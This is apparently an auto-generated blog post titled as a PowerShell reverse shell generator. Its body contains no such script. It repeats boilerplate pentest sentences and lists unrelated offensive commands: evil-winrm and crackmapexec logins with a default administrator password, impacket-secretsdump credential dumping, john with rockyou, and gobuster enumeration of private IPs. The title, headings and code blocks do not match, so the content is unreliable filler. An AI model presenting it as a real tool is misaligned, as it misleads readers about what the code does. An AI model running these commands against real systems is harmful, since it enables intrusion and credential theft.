---
TitleSEO: "Reverse Shell Generator in PowerShell | ZureFX"
TitlePost: "Reverse Shell Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for reverse shell generator. Built for security research and automation."
Keywords: "python, automation, scanner, c, tool, rust, powershell"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-811.html"
URL_IMAGES: ""
Date: "2025-06-28"
Tags: "Python, Automation, Scanner, C, Tool, Rust, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-811"
Permalink: "/scripting/script-reverse-shell-generator-811.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `msfvenom`
- `pwncat`
- `socat`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```powershell
evil-winrm -i 10.103.52.87 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

```powershell
crackmapexec smb 10.35.155.89 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.48.57.74 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.79.98
feroxbuster -h
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

```bash
feroxbuster -h
gobuster dir -u http://10.114.108.228/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.83.96.193 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 4.91s
```
